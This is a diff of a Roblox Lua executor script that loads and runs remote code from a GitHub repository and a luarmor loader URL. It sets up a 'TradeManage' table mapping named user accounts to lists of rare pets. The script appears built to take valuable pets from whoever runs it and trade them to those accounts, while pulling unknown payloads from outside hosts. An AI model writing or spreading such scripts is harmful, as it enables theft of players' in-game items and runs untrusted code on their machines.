@@ -1,75 +1,45 @@
-repeat task.wait() until game:IsLoaded()
-
-repeat wait() until game.Players
-repeat wait() until game.Players.LocalPlayer
-
-local VirtualInputManager = game:GetService("VirtualInputManager")
-repeat task.wait()
-    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
-    VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
-until game.Players.LocalPlayer:GetAttribute("DataFullyLoaded")
-
-game:GetService("Players").LocalPlayer.Idled:Connect(function()
-    game:GetService("VirtualUser"):Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
-    task.wait(1)
-    game:GetService("VirtualUser"):Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
-end)
-
-local function hasTargetPet(petList)
-    local success, result = pcall(function()
-        local player = game.Players.LocalPlayer
-        setthreadidentity(2)
-        local ActivePetsService = require(game:GetService("ReplicatedStorage").Modules.ReplicationClass).new("ActivePetsService_Replicator")
-        setthreadidentity(8)
-        local allData = ActivePetsService:YieldUntilData().Table.PlayerPetData[player.Name]["PetInventory"]["Data"]
-
-        for uuid, pet in pairs(allData) do
-            if table.find(petList, pet.PetType) then
-                return true
-            end
-        end
-        return false
-    end)
-
-    return success and result
-end
-
-getgenv().YourScript = function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/0xztnes/testsc/refs/heads/main/Loading"))()
+if not game:IsLoaded() then
+    repeat
+        game.Loaded:Wait()
+    until game:IsLoaded()
 end
 
 getgenv().KEY = "NASACOMPUTER888"
 _G.TradeManage = {
-    Target = {
-        "Ayoshipship",
-        "OrvilleuMoEfH",
-        "NoahXShop",
-        "SafiyaAlShafee72",
-        "KingSentz645770",
-        "zaq12wsx4z",
-        "19111993k",
-        "Taylor117k",
-        "oreosandmilk2q",
-        "Minecraft_1u",
-        "nachan279"
-    },
-    Pet = {
-        "Corrupted Kitsune",
-        "Kitsune",
-        "Mimic Octopus",
-        "Dragonfly",
-        "French Fry Ferret",
-        "Red Fox",
-        "Brontosaurus",
-        "Spaghetti Sloth",
-        "Capybara",
-        "Disco Bee",
-        "Butterfly",
-        "Mochi Mouse"
+    TargetConfigs = {
+        ["Ayoshipship"] = {
+            wantedPets = {"Corrupted Kitsune", "Kitsune", "French Fry Ferret", "Spaghetti Sloth"}
+        },
+        ["OrvilleuMoEfH"] = {
+            wantedPets = {"Corrupted Kitsune", "Kitsune", "French Fry Ferret", "Spaghetti Sloth"}
+        },
+        ["SafiyaAlShafee72"] = {
+            wantedPets = {"Corrupted Kitsune", "Kitsune", "French Fry Ferret", "Spaghetti Sloth"}
+        },
+        ["KingSentz645770"] = {
+            wantedPets = {"Corrupted Kitsune", "Kitsune", "Mimic Octopus", "Dragonfly"}
+        },
+        ["zaq12wsx4z"] = {
+            wantedPets = {"Corrupted Kitsune", "Kitsune", "Mimic Octopus", "Brontosaurus"}
+        },
+        ["19111993k"] = {
+            wantedPets = {"Corrupted Kitsune", "Kitsune", "Disco Bee", "Butterfly"}
+        },
+        ["Taylor117k"] = {
+            wantedPets = {"Capybara", "Mochi Mouse"}
+        },
+        ["oreosandmilk2q"] = {
+            wantedPets = {"Capybara", "Red Fox"}
+        },
+        ["Minecraft_1u"] = {
+            wantedPets = {"Capybara", "Mochi Mouse"}
+        },
+        ["nachan279"] = {
+            wantedPets = {"Capybara", "Red Fox"}
+        }
     }
 }
-if hasTargetPet(_G.TradeManage.Pet) then
-    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/64146f41d4c3ead8fb6d71339ef0c7c2.lua"))()
-else
+getgenv().YourScript = function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/0xztnes/testsc/refs/heads/main/LOAD1"))()
 end
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/64146f41d4c3ead8fb6d71339ef0c7c2.lua"))()
